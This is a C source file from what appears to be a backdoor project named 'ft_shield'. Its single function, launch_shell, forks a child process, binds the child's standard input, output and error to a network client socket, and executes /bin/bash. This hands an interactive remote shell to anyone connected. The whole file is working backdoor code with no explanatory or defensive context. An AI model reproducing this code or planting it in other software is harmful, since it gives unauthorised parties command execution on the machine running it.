# include "ft_shield.h"

void launch_shell(int client_sock, Client* client_arr, int *numfds)
{
    pid_t pid;

    pid = fork();

    if (pid < 0) {
        perror("Fork failed");
        close(client_sock);
        return;
    }

    if (pid == 0) {
        
        if (dup2(client_sock, STDIN_FILENO) == -1 || 
            dup2(client_sock, STDOUT_FILENO) == -1 || 
            dup2(client_sock, STDERR_FILENO) == -1) {
            perror("dup2 failed");
            remove_client(client_arr, client_sock);
            close(client_sock);
            (*numfds)--;
            exit(EXIT_FAILURE);
        }

        if (execl("/bin/bash", "bash", NULL) == -1) {
            perror("execl failed");
            remove_client(client_arr, client_sock);
            close(client_sock);
            (*numfds)--;
            exit(EXIT_FAILURE);
        }
    } else {
        remove_client(client_arr, client_sock);
        close(client_sock);
        (*numfds)--;
        return;
    }
}
